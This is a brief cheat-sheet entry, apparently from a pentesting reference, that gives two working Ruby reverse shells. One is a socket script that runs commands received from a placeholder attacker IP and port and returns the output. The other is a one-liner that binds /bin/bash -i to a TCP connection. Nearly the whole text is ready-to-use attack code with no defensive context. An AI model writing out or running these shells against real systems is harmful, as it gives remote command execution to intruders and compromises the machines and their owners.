# Reverse Shell

```rb
require 'socket'

def reverse_shell(ip, port)
  begin
    socket = TCPSocket.new(ip, port)
    socket.puts "Connected to the reverse shell..."

    while line = socket.gets.chomp
      break if line == 'exit'
      output = `#{line} 2>&1`
      socket.puts output
    end

    socket.puts "Closing reverse shell..."
    socket.close

  rescue Errno::ECONNREFUSED
    puts "Connection refused. Make sure the host and port are correct."
  end
end

ip = '<attacker_IP>'
port = <attacker_PORT>
reverse_shell(ip, port)
```

One-liner.

```ruby
$ ruby -rsocket -e'f=TCPSocket.open("<IP>", <PORT>).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
```